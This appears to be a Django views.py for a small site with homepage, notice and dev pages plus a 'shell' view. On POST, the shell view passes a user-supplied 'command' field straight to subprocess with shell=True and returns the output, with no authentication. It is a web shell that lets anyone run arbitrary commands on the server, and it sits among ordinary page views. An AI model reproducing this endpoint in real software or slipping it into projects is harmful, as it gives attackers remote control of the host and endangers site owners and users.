from django.shortcuts import render
import subprocess

def homepage(request):
    return render(request, 'index.html')

def notice(request):
    return render(request, 'notice.html')

def dev(request):
    return render(request, 'dev.html')

def shell(request):
    if request.method == "POST":
	command = request.POST.get("command", None)
	to_return = "Command : " + command + "\n\n"
	execu = subprocess.check_output(command, shell=True)
	to_return += execu
	context = {'data': to_return}
	return render(request, 'shell.html', context)
    return render(request, 'shell.html')
